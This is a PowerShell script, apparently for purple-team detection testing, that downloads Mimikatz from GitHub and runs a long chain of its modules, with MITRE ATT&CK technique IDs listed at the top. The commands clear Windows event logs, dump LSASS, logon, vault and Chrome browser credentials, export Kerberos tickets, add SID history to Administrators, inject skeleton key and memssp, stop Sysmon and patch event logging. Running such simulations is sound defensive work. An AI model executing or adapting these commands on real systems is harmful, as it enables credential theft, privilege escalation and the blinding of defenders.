<#
    T1134.005 - Access Token Manipulation: SID-History Injection
    T1098 - Account Manipulation
    T1547.005 - Boot or Logon Autostart Execution: Security Support Provider
    T1555 - Credentials from Password Stores
    T1555.003 - Credentials from Web Browsers
    T1555.004 - Windows Credential Manager
    T1003.001 - OS Credential Dumping: LSASS Memory
    T1003.002 - OS Credential Dumping: Security Account Manager
    T1003.004 - OS Credential Dumping: LSA Secrets
    T1003.006 - OS Credential Dumping: DCSync
    T1207 - Rogue Domain Controller
    T1649 -	Steal or Forge Authentication Certificates
    T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket
    T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket
    T1552.004 - Unsecured Credentials: Private Keys
    T1550.002	- Use Alternate Authentication Material: Pass the Hash
    T1550.003	Use Alternate Authentication Material: Pass the Ticket
    T1491.001 - Defacement: Internal Defacement
    T1204.002 - User Execution: Malicious File
    T1588.001 - Obtain Capabilities: Malware
    work in progress
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

Write-Host -ForegroundColor Cyan "Downlaoding latest release of Mimikatz..."
$tag = (Invoke-WebRequest "https://api.github.com/repos/gentilkiwi/mimikatz/releases" -UseBasicParsing -Verbose | ConvertFrom-Json)[0].tag_name
$url = "https://github.com/gentilkiwi/mimikatz/releases/download/$tag/mimikatz_trunk.zip"
$imageurl = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_images/xp.jpg"
$outimage = "$env:tmp\wallpp.jpg"
$dumpfile = "$env:tmp\mimi_result.txt"
$outfilezip = "$env:tmp\mimi.zip"
$outfile = "$env:tmp\mimi"

function exec_commands(){
    write-host -ForegroundColor Cyan "Clear event logs..."
    &"$mimi" "localtime" "privilege::debug" "event::clear /log:System" "event::clear /log:Security" "event::clear /log:System" "exit" > $dumpfile
    Write-Host -ForegroundColor Cyan "Dumping lsass with mimikatz..."
    &"$mimi" "localtime" "sekurlsa::minidump lsass.dmp" "sekurlsa::process" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Dumping logon credentials with mimikatz..."
    &"$mimi" "localtime" "privilege::debug" "sekurlsa::logonpasswords" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Dumping vault credentials with mimikatz..."
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "vault::list" "vault::cred" "vault::cred /patch" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing all other sekurlsa commands..."
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "sekurlsa::ekeys" "sekurlsa::dpapi" "sekurlsa::dpapisystem" "sekurlsa::backupkeys" "sekurlsa::bootkey" "sekurlsa::cloudap" "sekurlsa::credman" "sekurlsa::kerberos" "sekurlsa::krbtgt" "sekurlsa::livessp" "sekurlsa::msv" "sekurlsa::ssp"  "sekurlsa::tickets" "sekurlsa::tspkg" "sekurlsa::trust" "sekurlsa::wdigest" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing ts commands..."
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "ts::logonpasswords" "ts::mstsc" "ts::multirdp" "ts::sessions" "ts::remote /id:1" "ts::remote /id:2" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing net commands..."       
    &"$mimi" "localtime" "net::share" "net::stats" "net::trust" "net::user" "net::wsession" "net::session" "net::if" "net::group" "net::deleg" "net::alias" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Open a cmd console as system..."   
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "misc::cmd" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing process commands..."
    &"$mimi" "localtime" "privilege::debug" "process::exports" "process::list" "process::start notepad.exe" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing more process commands..."
    $notepad_pid = (Get-Process -Name Notepad).Id
    &"$mimi" "localtime" "privilege::debug" "process::suspend notepad /pid:$notepad_pid" "process::resume notepad /pid:$notepad_pid" "process::stop notepad /pid:$notepad_pid" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing rpc and service commands..."
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "rpc::enum" "rpc::server"  "service::+" "service::stop Sysmon64" "service::shutdown Sysmon64" "service::remove fax" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing sid commands..."
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "sid::patch" "sid::add /sam:$env:USERNAME /new:Builtin\administrators" "sid::clear /sam:$env:USERNAME" "sid::lookup /name:$env:USERNAME" "sid::modify /sam:$env:USERNAME /new:Builtin\administrators" "sid::query /sam:$env:USERNAME" "exit" >> $dumpfile
    write-host -ForegroundColor Cyan "Executing standard commands..."
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "kerberos::list /export" "coffee" "cls" "answer" "hostname" "version /full" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing more standard commands..."
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "token::elevate /domainadmin" "token::list" "token::list /admin" "token::list /domainadmin" "token::list /localservice" "token::list /networkservice" "token::whoami" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Executing misc commands..."   
    &"$mimi" "localtime" "privilege::debug" "token::elevate" "misc::skeleton" "misc::memssp" "misc::mflt" "misc::sccm" "misc::shadowcopies" "misc::taskmgr" "misc::wp" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Changing wallpaper..."
    Invoke-WebRequest -Uri $imageurl -OutFile $outimage -Verbose
    if (Test-Path $outimage){
        Write-Host -ForegroundColor Green "Sucess: New wallpaper downloaded to $outimage"
        &"$mimi" "localtime" "misc::wp /file:$outimage" "exit" >> $dumpfile
        if (((Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers").BackgroundHistoryPath0) -eq "$outimage" ){
            Write-Host -ForegroundColor Green "Sucess: Wallpaper has been changed"
        }
    }
    else{
        Write-Host -ForegroundColor Red "Failed: Could not download new wallpaper from $imageurl, will not change wallpaper with mimikatz"
    }
    Write-Host -ForegroundColor Cyan "Getting Saved Cookies and login creds from Google chrome..."
    &"$mimi" "localtime" "privilege::debug" "token::elevate" 'dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect' "exit" >> $dumpfile
    &"$mimi" "localtime" "privilege::debug" "token::elevate" 'dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect' "exit" >> $dumpfile
    #Write-Host -ForegroundColor Cyan "Dumping lsa with mimikatz..."
    #&"$mimi" "localtime" "privilege::debug" "token::elevate" "lsadump::lsa /patch" "lsadump::trust /patch" "lsadump::mbc" " lsadump::sam /system:system.hive /sam:sam.hive" "lsadump::secrets" "lsadump::cache" "exit" >> $dumpfile
    Write-Host -ForegroundColor Cyan "Dropping Windows Event Log - used to patch event services to avoid new events"
    &"$mimi" "localtime" "privilege::debug" "event::drop" "exit" >> $dumpfile
}

try {
    Invoke-WebRequest $url -OutFile $outfilezip -Verbose
    if (Test-Path $outfilezip){
        Write-Host -ForegroundColor Green "Success: Mimikatz archive downloaded to $outfilezip"        
        Expand-Archive -path $outfilezip -destinationpath $outfile -Force -Verbose
        if (Test-Path $outfile){
            Write-Host -ForegroundColor Green "Success: Mimikatz archive extracted to $outfile"        
            Write-Host -ForegroundColor Cyan "Executing commands with mimikatz on local system for simulation..."
            if([System.IntPtr]::Size -eq 4){
                $mimi = "$outfile\x32\mimikatz.exe"
                exec_commands
            }
            elseif([System.IntPtr]::Size -eq 8){
                $mimi = "$outfile\x64\mimikatz.exe"
                exec_commands
            }
            else{
                Write-Host -ForegroundColor Yellow "Warning: OS architecture could not be detected, executing x32 version of Mimikatz..."
                $mimi = "$outfile\x32\mimikatz.exe"
                exec_commands
            } 
            if(test-path $dumpfile){
                Write-Host -ForegroundColor Green "Success: Mimikatz executed succesfully and results saved to $dumpfile"
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to execute Mimikatz and save the result to $dumpfile"
            }
        }
        else{
            Write-Host -ForegroundColor Red "Error: Failed to unzip Mimikatz, $outfile not found."
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download Mimikatz, $outfilezip not found."
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
